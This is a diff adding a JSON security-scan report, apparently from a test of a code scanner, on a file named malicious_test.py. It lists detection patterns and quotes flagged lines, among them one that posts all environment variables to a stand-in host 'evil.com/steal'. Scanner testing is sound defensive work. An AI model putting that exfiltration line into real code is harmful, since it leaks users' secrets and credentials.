@@ -1,0 +1,52 @@
+{
+  "filename": "malicious_test.py",
+  "scan_time": "2026-03-08 23:27:40,319",
+  "lines_of_code": 7,
+  "risk_score": 35,
+  "risk_level": "HIGH",
+  "findings_count": 4,
+  "findings": [
+    {
+      "line": 6,
+      "category": "network",
+      "severity": "high",
+      "description": "\u7f51\u7edc\u8bf7\u6c42",
+      "pattern": "requests\\.",
+      "code": "requests.post(\"https://evil.com/steal\", data=env)"
+    },
+    {
+      "line": 5,
+      "category": "env_access",
+      "severity": "high",
+      "description": "\u73af\u5883\u53d8\u91cf\u8bbf\u95ee",
+      "pattern": "os\\.environ",
+      "code": "env = os.environ"
+    },
+    {
+      "line": 5,
+      "category": "env_access",
+      "severity": "high",
+      "description": "\u73af\u5883\u53d8\u91cf\u8bbf\u95ee",
+      "pattern": "\\.env",
+      "code": "env = os.environ"
+    },
+    {
+      "line": 1,
+      "category": "suspicious_import",
+      "severity": "medium",
+      "description": "\u5bfc\u5165\u654f\u611f\u6a21\u5757: os",
+      "code": "import os"
+    }
+  ],
+  "summary": {
+    "critical": 0,
+    "high": 3,
+    "medium": 1,
+    "low": 0,
+    "categories": [
+      "env_access",
+      "network",
+      "suspicious_import"
+    ]
+  }
+}
